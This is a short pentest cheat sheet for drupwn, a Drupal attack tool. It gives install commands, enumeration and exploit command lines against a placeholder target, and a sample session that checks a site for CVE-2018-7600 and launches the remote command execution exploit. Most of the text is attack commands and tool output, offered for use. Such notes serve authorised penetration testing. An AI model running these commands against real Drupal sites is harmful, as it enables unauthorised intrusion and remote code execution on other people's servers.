Inspired in C4N6
#
#
#
This guide cover the two actual modes supported by this great tool 
# drupwn
#
#

## Install
        cd /usr/share/ && git clone https://github.com/immunIT/drupwn.git && cd drupwn && python setup.py install && pip3 install -r requirements.txt

## Enumeration
        cd /usr/share/drupwn && python3 drupwn enum https://yourtarget.com --nodes --dfiles --themes --version x --users --range 10 --thread 10 --log

#
#
#
## Exploit

        cd /usr/share/drupwn && python3 drupwn exploit https://yourtarget.com --nodes --dfiles --themes --version x --users --range 10 --thread 10 --log


#
#
#


        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]

Drupwn> list
+---------------+--------------------------+------------------------+
|      CVE      |       Description        |   Versions affected    |
+---------------+--------------------------+------------------------+
| CVE-2018-7600 | Remote Command Execution | 7.x < 7.58 & 8.x < 8.1 |
+---------------+--------------------------+------------------------+

Drupwn> check CVE-2018-7600

[+] Application vulnerable


Drupwn> exploit CVE-2018-7600


Drupwn>  


#
#
#
From this point in advance let that your curiosity be spontaneous...
